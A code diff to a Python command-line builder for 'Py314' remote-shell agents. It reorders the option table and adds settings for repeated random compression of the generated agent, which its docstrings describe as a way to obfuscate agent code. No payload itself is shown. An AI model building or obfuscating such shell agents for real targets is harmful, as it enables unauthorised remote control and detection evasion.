@@ -1,6 +1,7 @@
 import os
 import logging
 from cmd import Cmd
+from random import randint
 from termcolor import colored
 from generaters import template
 from prettytable import PrettyTable
@@ -13,11 +14,13 @@ class Prompt(Cmd):
     py314Folder = f"{homeFolder}/.Py314"
 
     optionsDict = {
-        'type': 'bind_agent',
-        'host': '10.0.10.110',
-        'port': 1234,
-        'password': 'Py314!',
-        'outfile': f"{py314Folder}/agent.py"
+        'host':         [1, '10.0.10.110'],
+        'port':         [2, 1234],
+        'password':     [3, 'Py314!'],
+        'type':         [4, 'bind_agent'],
+        'outfile':      [5, f"{py314Folder}/agent.py"],
+        'compress':     [6, False],
+        'iterations':   [7, randint(2, 12)]
     }
 
 
@@ -103,7 +106,7 @@ class Prompt(Cmd):
         print("""If the connection is successfull, a shell is automatically give, and remote actions are allowed\n""")
 
         table = PrettyTable()
-        headers = ['name', 'value', 'description']
+        headers = ['weight', 'name', 'value', 'description']
         table.field_names = headers
         for header in headers:
             table.align[header] = 'l'
@@ -111,12 +114,17 @@ class Prompt(Cmd):
         for option in dir(self):
             if option.startswith('set_'):
                 optionName = option.replace('set_', '')
-                optionValue = self.optionsDict[optionName]
+                optionWeight = self.optionsDict[optionName][0] 
+                optionValue = self.optionsDict[optionName][1]
                 optionDoc = getattr(self, option).__doc__
 
-                table.add_row([optionName, optionValue, optionDoc])
+                table.add_row([optionWeight, optionName, optionValue, optionDoc])
 
-        print(table)
+        #print(table)
+
+        print(table.get_string(fields=['name', 'value', 'description'],sortby='weight'))
+
+
 
     def do_set(self, arg):
         """Set value for available option : set <option> <value>"""
@@ -139,7 +147,7 @@ class Prompt(Cmd):
                     print(f" - {agent}")
             else:
                 logger.debug(f'Option [{option}] set to [{value}]')
-                self.optionsDict[option] = value
+                self.optionsDict[option][1] = value
 
 
 
@@ -157,7 +165,7 @@ class Prompt(Cmd):
             if option not in availableOptions:
                 logger.warning(f"Option {option} can't be unset")
             else:
-                self.optionsDict[option] = ''
+                self.optionsDict[option][1] = ''
 
 
 
@@ -178,6 +186,12 @@ class Prompt(Cmd):
 
     def set_password(self):
         """Define a password use to connect to Py314 agent and to perform symetric encryption of traffic"""
+
+    def set_compress(self):
+        """Enable or disable compression to obfuscate agent code (random choice between bz2, gz2, lzma)"""
+
+    def set_iterations(self):
+        """Define number of successives random compression"""
 
 
 
